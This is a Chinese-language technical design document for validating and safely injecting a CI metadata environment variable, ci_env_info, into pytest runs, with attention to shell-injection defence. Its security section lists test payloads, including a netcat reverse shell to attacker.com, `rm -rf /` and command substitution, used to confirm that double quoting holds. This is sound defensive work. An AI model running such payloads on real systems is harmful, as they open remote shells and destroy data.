# ci-env-info-metadata-validation — 技术设计

## 方案概述

以 `ci_env_info` 作为唯一契约名贯穿四层：插件把它当命令行参数名、`Config` 把它当分组键、
用例把它当环境变量名。数据自 runner 起沿
`process.env.ATOMGIT_* → buildCiEnvInfo() → --ci_env_info JSON → Config.validate_ci_env_info()
→ 用例进程环境` 单向流动，中途只在 `Config` 一处做校验与清洗，注入侧按执行模式分两路落地
（环境字典 / shell export）。

## 架构决策

### 1. 单层分组 + 白名单恒定键

| 决策                                             | 原因                                                                                                             |
| ------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------- |
| 传输结构固定为 `{"ci_env_info": {...}}` 一层分组 | 分组键与最终环境变量名同名，四层无需任何重命名映射表；后续新增其它元数据分组时可在同层并列，不破坏既有解析       |
| 字段白名单 `CI_ENV_INFO_KEYS` 定义在 `Config` 上 | 白名单同时决定「入参接受哪些字段」和「出参保证哪些字段」，一处定义两处生效，避免插件与用例两侧漂移               |
| 输出补齐 5 个键，缺失值为 `""`                   | 用例侧可以无条件 `info["job_name"]`，不必写 5 次 `.get(k, "")`；键缺失与值为空是两种不同故障，补齐后用例不必区分 |
| 未支持字段丢弃并告警                             | 插件先行、调度框架后上线时，新字段静默丢弃而不是让整轮用例失败                                                   |

### 2. 校验落在 `Config` 的 staticmethod

| 决策                                                                                   | 原因                                                                                                                                                                      |
| -------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `validate_ci_env_info` / `_clean_ci_env_value` 挂在 `Config` 上，声明为 `staticmethod` | 两个消费方（`main.py` 写入侧、`PytestExecutor` 读取侧）都已经 import 了 `Config`，零新增依赖；不引入 `ci_env_validator.py` 是为了不在只有一个函数的模块上再加一层导入路径 |
| 常量（分组名、白名单、长度上限、控制字符正则）与校验函数同处一个类                     | 白名单改动时必然需要同步看校验逻辑，物理相邻降低漏改概率                                                                                                                  |
| 无实例状态可读，统一用 `staticmethod` 而非 `classmethod`                               | 校验通过 `Config.XXX` 显式引用类常量，不需要 `cls` 绑定                                                                                                                   |

### 3. 降级清洗而非 fail-fast

| 决策                                                     | 原因                                                                                                                                                                      |
| -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 任何非法输入都返回合法结构，只 `logger.warning` 不抛异常 | CI 元数据是**辅助诊断信息**，不是执行必要输入。为此中断一轮用例调度（占用测试机、消耗流水线时间）代价与收益不成比例                                                       |
| 空入参不告警                                             | `--ci_env_info` 是 optional 参数，本地手工调试时不传是正常路径，告警会成为噪音。因此结构判断写成 `if raw and not isinstance(group, dict)`，只在「传了但传错」时告警       |
| 告警只打类型名和字段名，不打值内容                       | 该字段来自 CI 环境，值可能包含内部主机名、路径等信息；且超长值原样打印会污染日志。`_clean_ci_env_value` 的非法类型分支输出 `type(value).__name__`，截断分支只输出上限数字 |

对齐仓内既有的宽容风格：`_is_safe_path`、`_read_pytest_config`、`parse_json_param`
都是「异常降级 + 告警」，没有 fail-fast 先例。

### 4. 读取侧做二次校验，不引入缓存

| 决策                                                                            | 原因                                                                                                                                            |
| ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `_ci_env_vars()` 内部重新调用 `Config.validate_ci_env_info(Config.ci_env_info)` | `Config.ci_env_info` 是类属性，除 CLI 之外任何代码路径都可以改写（`Config.set` 是公开能力）。注入前复校验可以兜住脏值抛异常把整轮用例带崩的情况 |
| 不加缓存/不改写成 property                                                      | 目前写入路径只有 `_init_config` 一处，每轮用例调度多一次字典推导 + 正则替换的开销可忽略；引入缓存反而带来「改了配置不生效」的一致性风险         |

### 5. 序列化与 shell 引用

| 决策                                                                   | 原因                                                                                                                               |
| ---------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| `json.dumps` 使用默认 `ensure_ascii=True`                              | `local` 模式的载荷要经 SSH 传到远端登录 shell 再解析。纯 ASCII 转义（`中文` → `\uXXXX`）使整条链路不依赖远端 locale 设置，规避乱码 |
| 只注入**一个**环境变量，值为 JSON 字符串                               | 注入 5 个变量会把 5 个变量名变成公开契约，且增加被其它逻辑覆盖 collision 的面。单变量使 `export` 片段退化为一次引用                |
| `local` 模式对值施加 `shlex.quote`，且外层 `bash -lc` 再 quote 一次    | 双重引用是本模式的安全支点，详见「安全设计」                                                                                       |
| `runner` / `remote` 模式走 `subprocess` 环境字典 `run_env.update(...)` | 环境字典不经过 shell，元字符天然惰性，无需额外转义                                                                                 |
| key 恒为 `Config.CI_ENV_INFO_GROUP` 字面量                             | 攻击者只能影响值，不能影响变量名，见「安全设计」第 3 点                                                                            |

### 6. 值清洗的三层规则

| 顺序 | 规则                                             | 目的                                                                                                               |
| ---- | ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------ |
| 1    | `None → ""`                                      | 缺失字段与空值统一语义                                                                                             |
| 2    | 非 `(str, int, float)` → `""` + 告警             | 挡住 dict/list/bool 场景下的结构污染；`int`/`float` 转字符串以兼容 `run_number` 传数字                             |
| 3    | `re.sub(r"[\x00-\x1f\x7f-\x9f]", "", s).strip()` | NUL 会截断 C 层字符串并把一个变量拆成两个；`\n` 会破坏 shell 命令行与日志；NUL/换行无法安全进入环境变量与远端 exec |
| 4    | 超过 `CI_ENV_INFO_VALUE_MAX_LEN = 128` 截断      | `local` 模式整个命令行（含所有 export 与 pytest 参数）要走 SSH exec 报文，超长值有撑爆风险                         |

> 第 4 步是**尺寸保护，不是安全控制**。不能把它当作 payload 长度上限来依赖：
> 128 字符的 shell 元字符与 5000 字符的 shell 元字符同样惰性，防线是第 5 节的双重引用。

## 涉及文件

| 文件                                                | 操作 | 说明                                                                                                                                                                            |
| --------------------------------------------------- | ---- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `pytest-executor/src/scheduler/scheduler_config.py` | 修改 | 新增 `ci_env_info` 配置项、`CI_ENV_INFO_GROUP` / `CI_ENV_INFO_KEYS` / `CI_ENV_INFO_VALUE_MAX_LEN` / `_CI_ENV_CONTROL_CHARS` 常量、`validate_ci_env_info`、`_clean_ci_env_value` |
| `pytest-executor/main.py`                           | 修改 | 新增 `--ci_env_info` 参数定义、`_parse_ci_env_info` 委托函数、`_init_config` 中 `Config.set("ci_env_info", ...)`                                                                |
| `pytest-executor/src/executor/pytest_executor.py`   | 修改 | 新增 `_ci_env_vars` / `_ci_env_exports`；`runner`+`remote` 注入点 `run_env.update()`；`local` 模式命令装配插入 `ci_exports`                                                     |
| `pytest-executor/tests/test_ci_env_info.py`         | 新增 | 24 个测试函数（含参数化展开共 47 例），覆盖校验器 / CLI 解析 / 执行器注入三层                                                                                                   |
| `test-action/pytest-orch/index.js`                  | 修改 | 新增 `buildCiEnvInfo()`；`mainPyArgs.push("--ci_env_info", JSON.stringify(...))`；入参回显与命令行打印各加一行                                                                  |
| `test-action/pytest-orch/dist/index.js`             | 修改 | `index.js` 的 ncc 打包产物，必须同步重打包，否则线上不生效                                                                                                                      |

## 核心代码结构

```python
# scheduler_config.py —— 契约与校验的唯一产地

ci_env_info = {"ci_env_info": {}}          # 默认值即合法结构，未传参时用例读到 5 个空串
CI_ENV_INFO_GROUP = "ci_env_info"          # 分组名 == 环境变量名
CI_ENV_INFO_KEYS = ("project_name", "workflow_name",
                    "job_name", "run_number", "step_name")
CI_ENV_INFO_VALUE_MAX_LEN = 128
_CI_ENV_CONTROL_CHARS = re.compile(r"[\x00-\x1f\x7f-\x9f]")

@staticmethod
def validate_ci_env_info(raw):
    # 取分组 → 非字典则告警并降级 → 丢弃白名单外字段并告警 → 按白名单逐项清洗
    group = raw.get(Config.CI_ENV_INFO_GROUP) if isinstance(raw, dict) else None
    if raw and not isinstance(group, dict):        # 空入参不告警
        logger.warning("ci_env_info 入参结构不合法, 期望分组下挂 JSON 对象, 已降级为空")
    group = group if isinstance(group, dict) else {}
    unknown = sorted(set(group) - set(Config.CI_ENV_INFO_KEYS))
    if unknown:
        logger.warning(f"{Config.CI_ENV_INFO_GROUP} 丢弃未支持字段: "
                       f"{', '.join(map(str, unknown))}")   # map(str,..) 防非字符串 key TypeError
    return {Config.CI_ENV_INFO_GROUP:
            {f: Config._clean_ci_env_value(f, group.get(f)) for f in Config.CI_ENV_INFO_KEYS}}

@staticmethod
def _clean_ci_env_value(field, value):
    if value is None:
        return ""
    if not isinstance(value, (str, int, float)):   # 只打类型名，不打值
        logger.warning(f"ci_env_info.{field} 的值不是标量, 已置空: {type(value).__name__}")
        return ""
    cleaned = Config._CI_ENV_CONTROL_CHARS.sub("", str(value)).strip()
    if len(cleaned) > Config.CI_ENV_INFO_VALUE_MAX_LEN:    # 只打上限，不打值
        logger.warning(f"ci_env_info.{field} 超出 "
                       f"{Config.CI_ENV_INFO_VALUE_MAX_LEN} 字符, 已截断")
        cleaned = cleaned[: Config.CI_ENV_INFO_VALUE_MAX_LEN]
    return cleaned
```

```python
# pytest_executor.py —— 注入侧

@staticmethod
def _ci_env_vars() -> Dict[str, str]:
    validated = Config.validate_ci_env_info(Config.ci_env_info)   # 全仓唯一读取点
    payload = json.dumps(validated[Config.CI_ENV_INFO_GROUP])     # ensure_ascii → 纯 ASCII
    return {Config.CI_ENV_INFO_GROUP: payload}                    # key 恒为字面量

@staticmethod
def _ci_env_exports() -> str:
    return "".join(f"&& export {key}={shlex.quote(value)} "
                   for key, value in PytestExecutor._ci_env_vars().items())

# runner / remote 模式：走环境字典
run_env.update(self._ci_env_vars())

# local 模式：装配远端命令，注意内层与外层各 quote 一次
case_cmd = (f"mkdir -p {shlex.quote(log_dir)} "
            f"&& export TESTBED_DEVICES={shlex.quote(env_var)} "
            f"{ci_exports}"                       # ← 内层 shlex.quote 在这里
            f"&& echo $PATH && {install_cmd} && {pytest_cmd}")
wrapped_cmd = (f"cd {shlex.quote(local_test_dir)} && bash -lc "
               f"{shlex.quote('exec 2>&1; ' + case_cmd + ' ; echo __EXIT__=$?')}")
               # ← 外层 shlex.quote：第二道引用
```

## 安全设计

### Source → Sink 链路

| 环节                            | 形态                             | 是否经 shell                                                                                   |
| ------------------------------- | -------------------------------- | ---------------------------------------------------------------------------------------------- |
| `process.env.ATOMGIT_*`         | runner 注入                      | —                                                                                              |
| `buildCiEnvInfo()`              | 原样取 5 个值，无加工            | —                                                                                              |
| `JSON.stringify` → `mainPyArgs` | argv 元素                        | **否**：`@actions/exec` 最终走 `child.spawn(file, argsArray, opts)`，Linux runner 上不经 shell |
| `main.py --ci_env_info`         | `argparse` 字符串                | 否                                                                                             |
| `Config.validate_ci_env_info`   | 结构 + 白名单 + 值清洗           | —                                                                                              |
| `runner` / `remote` 注入        | `subprocess` 环境字典            | **否**：元字符在环境向量里是惰性数据                                                           |
| `local` 注入                    | 远端命令行的 `export k=<quoted>` | **是**：见下                                                                                   |

### `local` 模式的双重引用为何不可绕过

载荷要经过两次 shell 解析：远端登录 shell 解一次，`bash -lc` 解一次，对应两层引用。

1. 内层 `export ci_env_info=<shlex.quote(payload)>` 把 `payload` 包成单引号字符串，
   内部单引号转成 `'\''`；
2. 外层 `bash -lc <shlex.quote(整条 case_cmd)>` 再把包含上述内容的整串包成单引号。

远端登录 shell 剥掉外层单引号（`'\''` 精确还原为 `'`）后，`case_cmd` 逐字符复现；
`bash -lc` 做第二层解析时，内层单引号仍在，于是 `payload` 中的
`$`、反引号、`;`、`|`、`&`、`(`、`)`、`"`、`'` 全部按字面量进入变量值。

**这条防线不依赖白名单，属于结构性防护**——即使校验正则漏过某个字符，引用层仍然成立。

实测：9 个真实恶意载荷
（`$(id)`、`` `id` ``、`'; touch /tmp/PWNED; '`、`| nc attacker.com 1337 -e /bin/sh`、
`"; rm -rf / #`、50 个连续单引号等）走完整双重引用后交 `bash -c` 执行，
结果全部 `rc=0`、字节精确还原为字面量、canary 文件未生成，**零逃逸**。

### 环境变量名不可控

`_ci_env_vars()` 返回的字典 key 恒为字面量 `Config.CI_ENV_INFO_GROUP`，
攻击者**控值不控名**。两个后果：

- 无法借注入覆盖 `PRIVATE_KEY_PEM` 等已由 `_sanitize_env_vars` 抹成 `***` 的凭证变量；
- 清洗剔除了 NUL，无法把一个变量拆成两个 `KEY=VALUE`，即无法凭空造出第二个变量名。

补充：字符串 `ci_env_info` 不含 `_SENSITIVE_ENV_KEYWORDS` 中任一子串
（`password` / `pwd` / `secret` / `token` / `ak` / `sk` / `api_key` / `private_key` /
`ssh_key` / `pem` / `credential` / `auth` / `user` / `gitcode` / `obs` 等），
因此不会被本仓自家脱敏逻辑误伤成 `***`。

### 其它注入类别适用性

全仓 grep 确认 `Config.ci_env_info` **仅被 `_ci_env_vars` 一处读取**，不流向
文件路径、URL 拼接、SQL、`os.system`、测试报告或 metadata 上报体。
路径穿越 / SSRF / SQL 注入 / 上报体污染等类别因缺少 sink 而不成立。

### 已识别但未修复的缺口

控制字符正则 `[\x00-\x1f\x7f-\x9f]` 只覆盖 Unicode `Cc` 类别（C0 / DEL / C1），
**不含 `Cf` 格式字符**，也不排除孤立代理。实测确认两类载荷可以存活通过清洗：

| #   | 缺口                                                                                             | 实测现象                                                                                                                                                                                                                                                           | 影响面                                                                                     |
| --- | ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------ |
| 1   | 孤立代理字符（如 `U+D800`）存活                                                                  | `json.dumps(ensure_ascii=True)` 把它转成 ASCII 安全的 `\ud800` 六字符，所以 `os.environ` 不设限也不报错；用例 `json.loads` 还原为真孤立代理，直到用例**首次 UTF-8 输出**（`print` / 写文件）才炸 `UnicodeEncodeError: surrogates not allowed`（实测子进程 `rc=1`） | 崩溃从调度器被推迟并隐藏进用户用例，失败现象与根因分离，定位成本高                         |
| 2   | Unicode `Cf`：`U+202E`(RLO) / `U+200B`(ZWSP) / `U+200E`(LRM) / `U+FEFF`(BOM) / `U+2060`(WJ) 存活 | 探针实测 5 个字符 `survived=True`                                                                                                                                                                                                                                  | 终端显示欺骗。RLO 可使一段文本在 CI 控制台或本地终端渲染成另一副样子（如包名左右顺序反转） |

> 说明：#2 属于 log/display spoofing 类别，按通用安全审查规则通常不作为可利用漏洞上报；
> #1 的影响面也是可用性而非完整性。两者列为**数据质量与排障成本**问题，
> 而非独立可利用漏洞。修复动作（往字符类里补 Cf 与代理区间，或改为字符白名单）
> **尚未获得授权，本次变更未包含任何修复代码**。

### 信任边界前提（未决）

`ATOMGIT_WORKFLOW` / `ATOMGIT_JOB` / `ATOMGIT_ACTION` 取自流水线 YAML 中的
workflow / job / step 名称。这三个字段是否属于不可信输入，取决于 AtomGit 对
fork PR 取**哪个分支**的 YAML 来定义这些名字：

- 若只读 base 分支的 YAML → 需要仓库写权限才能改这些名字，属可信输入，上述缺口维持低影响；
- 若读头部分支（PR 提交者可控）的 YAML → 这三个字段不可信，缺口的严重度需要相应上调。

**本仓代码无法判定该语义**，需 CI 平台侧确认。

## 风险 & 缓解

| 风险                                              | 缓解措施                                                                                                                          |
| ------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `local` 模式 export 值含 shell 元字符导致命令注入 | 双重 `shlex.quote`（结构性防护，不依赖白名单）；9 个真实载荷 `bash -c` 实测零逃逸，canary 文件未生成                              |
| 脏值使注入抛异常，拖垮整轮用例                    | 注入前二次校验；`validate_ci_env_info` 对任意输入返回合法结构；测试专门覆盖「脏 Config 仍能暴露全键」「脏值不能打断注入」两个场景 |
| 超长值撑爆 SSH exec 命令行                        | 128 字符截断（尺寸保护，非安全控制，见架构决策 6）                                                                                |
| 非 ASCII 值经 SSH 后乱码                          | `ensure_ascii=True` 输出纯 ASCII，不依赖远端 locale                                                                               |
| 用例直接下标访问 `KeyError`                       | 白名单 5 键恒定补齐，测试断言 `list(Config.CI_ENV_INFO_KEYS) == EXPECTED_KEYS` 防漂移                                             |
| 插件与调度框架字段名漂移                          | 测试用字面量常量 `EXPECTED_KEYS` 而非引用 `Config.CI_ENV_INFO_KEYS` 做断言，改名会被测试捕获                                      |
| 告警日志泄露内部信息                              | 告警只输出字段名、类型名、长度上限，不输出值内容                                                                                  |
| Unicode 孤立代理推迟到用例内崩溃                  | **未修复**。当前用例可通过 `info["workflow_name"].encode("utf-8", "replace")` 自行兜底                                            |
| Unicode Cf 字符造成终端显示欺骗                   | **未修复**。插件回显与调度日志均原样输出这些字符                                                                                  |
| 只改 `index.js` 忘记重打包导致线上不生效          | 已在涉及文件中把 `dist/index.js` 单列一行强调；`action.yml` 的 `runs.main` 指向 `dist/index.js`                                   |

## 测试策略

### 单元测试覆盖场景（`tests/test_ci_env_info.py`，47 例）

| 测试类                        | 场景                                                                                                                                                                                                                       |
| ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `TestValidateCiEnvInfo`       | 白名单与用例侧契约一致（字面量断言）；完整入参原样保留；缺失字段补空串；脏结构参数化降级；未支持字段丢弃；非标量值置空；`int`/`float` 标量转字符串；控制字符剔除参数化；超长截断；**校验幂等性**                           |
| `TestParseCiEnvInfo`          | CLI 层完整入参保留分组与全键；缺失字段回退空串；非字符串值强转；空/非法 JSON 返回空键；脏分组返回空键；未支持字段丢弃                                                                                                      |
| `TestPytestExecutorCiEnvVars` | 分组以单个 JSON 环境变量暴露；值全部字符串化；脏 Config 仍暴露全键；脏值不能打断环境注入；非 ASCII 值保持 ASCII 安全；`local` 模式 export 经 shell 引用；`local` 模式恒发出 export；`runner`/`remote` 环境字典包含 CI 变量 |

关键设计：

- 白名单断言使用**字面量** `EXPECTED_KEYS`，若 `Config.CI_ENV_INFO_KEYS` 被改名或增删，测试立即失败；
- 通过 `restore_ci_env_info` fixture 保护 `Config.ci_env_info` 类属性，避免测试间污染；
- 幂等性测试断言 `validate(validate(x)) == validate(x)`，支撑「读取侧二次校验」决策的正确性。

### 集成验证

| 验证项        | 方式                                                      | 结果                                                                   |
| ------------- | --------------------------------------------------------- | ---------------------------------------------------------------------- |
| 全量单元测试  | `pytest --ignore=tests/test_xml_processor.py`             | 79 passed                                                              |
| 语法编译      | `py_compile` 三个改动文件                                 | 通过                                                                   |
| 行宽约束      | 逐行扫描 > 99 列                                          | 本次改动无超长行（仅预存 `mount_script_path` 一行 107 列，非本次引入） |
| shell 逃逸    | 独立探针脚本，9 个真实载荷走完整双重引用后 `bash -c` 执行 | rc 全 0，字面量精确还原，canary 文件未生成                             |
| 编码/类型边界 | 独立探针脚本，13 类边界载荷                               | 无一抛异常；照出上述两个字符类缺口                                     |

> `tests/test_xml_processor.py` 因缺 `obs` 模块无法收集，属预存环境问题，与本次变更无关，
> 测试统一 `--ignore` 该项。

## 跨仓影响

本次变更**跨两个仓**，且改动下游消费契约：

| 仓                           | 影响                                                                                                                                                            |
| ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `test-action`                | `pytest-orch` 新增 `buildCiEnvInfo()` 与 `--ci_env_info` 透传；改 `index.js` **必须** ncc 重打包 `dist/index.js`，因为 `action.yml` 的 `runs.main` 指向打包产物 |
| `openlibing-pytest-executor` | 新增 CLI 参数（向后兼容，`required=False`）；`Config` 新增分组与校验 API                                                                                        |
| 用例仓（消费方）             | `ci_env_info` 环境变量的 JSON 值现**恒定含 5 个键**。若有用例写过 `json.loads(os.environ["ci_env_info"]) == 传入dict` 这类整体相等断言，需要改为按键访问        |

发布顺序建议：先发 `openlibing-pytest-executor`（新参数 optional，旧插件不传也能跑），
再发 `test-action`（开始透传）。反向顺序下，新插件向旧调度框架传 `--ci_env_info`
会命中 `argparse` 未定义参数而报错。
